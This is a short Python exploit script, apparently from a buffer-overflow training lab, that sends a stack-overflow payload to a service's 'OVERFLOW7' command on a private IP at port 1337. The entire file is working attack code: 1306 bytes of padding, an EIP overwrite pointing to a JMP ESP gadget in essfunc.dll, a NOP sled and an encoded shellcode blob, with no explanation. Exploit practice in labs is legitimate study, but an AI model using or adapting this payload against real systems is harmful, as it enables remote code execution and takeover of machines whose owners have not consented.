import socket
import sys
import time


print("[+] Nani???? Got shell!!\n")

buff = "A" * 1306

EIP = "\xf7\x11\x50\x62" # 625011F7 JMP ESP essfunc.dll

nops = "\x90" * 16

shellcode =  b""
shellcode += b"\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0"
shellcode += b"\x5e\x81\x76\x0e\x53\x20\x36\x13\x83\xee\xfc"
shellcode += b"\xe2\xf4\xaf\xc8\xb4\x13\x53\x20\x56\x9a\xb6"
shellcode += b"\x11\xf6\x77\xd8\x70\x06\x98\x01\x2c\xbd\x41"
shellcode += b"\x47\xab\x44\x3b\x5c\x97\x7c\x35\x62\xdf\x9a"
shellcode += b"\x2f\x32\x5c\x34\x3f\x73\xe1\xf9\x1e\x52\xe7"
shellcode += b"\xd4\xe1\x01\x77\xbd\x41\x43\xab\x7c\x2f\xd8"
shellcode += b"\x6c\x27\x6b\xb0\x68\x37\xc2\x02\xab\x6f\x33"
shellcode += b"\x52\xf3\xbd\x5a\x4b\xc3\x0c\x5a\xd8\x14\xbd"
shellcode += b"\x12\x85\x11\xc9\xbf\x92\xef\x3b\x12\x94\x18"
shellcode += b"\xd6\x66\xa5\x23\x4b\xeb\x68\x5d\x12\x66\xb7"
shellcode += b"\x78\xbd\x4b\x77\x21\xe5\x75\xd8\x2c\x7d\x98"
shellcode += b"\x0b\x3c\x37\xc0\xd8\x24\xbd\x12\x83\xa9\x72"
shellcode += b"\x37\x77\x7b\x6d\x72\x0a\x7a\x67\xec\xb3\x7f"
shellcode += b"\x69\x49\xd8\x32\xdd\x9e\x0e\x48\x05\x21\x53"
shellcode += b"\x20\x5e\x64\x20\x12\x69\x47\x3b\x6c\x41\x35"
shellcode += b"\x54\xdf\xe3\xab\xc3\x21\x36\x13\x7a\xe4\x62"
shellcode += b"\x43\x3b\x09\xb6\x78\x53\xdf\xe3\x43\x03\x70"
shellcode += b"\x66\x53\x03\x60\x66\x7b\xb9\x2f\xe9\xf3\xac"
shellcode += b"\xf5\xa1\x79\x56\x48\xf6\xbb\x52\xd1\x5e\x11"
shellcode += b"\x53\x21\x8d\x9a\xb5\x4a\x26\x45\x04\x48\xaf"
shellcode += b"\xb6\x27\x41\xc9\xc6\xd6\xe0\x42\x1f\xac\x6e"
shellcode += b"\x3e\x66\xbf\x48\xc6\xa6\xf1\x76\xc9\xc6\x3b"
shellcode += b"\x43\x5b\x77\x53\xa9\xd5\x44\x04\x77\x07\xe5"
shellcode += b"\x39\x32\x6f\x45\xb1\xdd\x50\xd4\x17\x04\x0a"
shellcode += b"\x12\x52\xad\x72\x37\x43\xe6\x36\x57\x07\x70"
shellcode += b"\x60\x45\x05\x66\x60\x5d\x05\x76\x65\x45\x3b"
shellcode += b"\x59\xfa\x2c\xd5\xdf\xe3\x9a\xb3\x6e\x60\x55"
shellcode += b"\xac\x10\x5e\x1b\xd4\x3d\x56\xec\x86\x9b\xd6"
shellcode += b"\x0e\x79\x2a\x5e\xb5\xc6\x9d\xab\xec\x86\x1c"
shellcode += b"\x30\x6f\x59\xa0\xcd\xf3\x26\x25\x8d\x54\x40"
shellcode += b"\x52\x59\x79\x53\x73\xc9\xc6"



payload = buff + EIP + nops + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Application
s.connect(('192.168.1.117', 1337))
s.recv(1024)	#Recv the banner


#Finally the vulnerable command
s.send('OVERFLOW7 ' + payload + '\r\n')
s.send('EXIT\r\n')
s.close()
	
print("[+] Execution Finished")
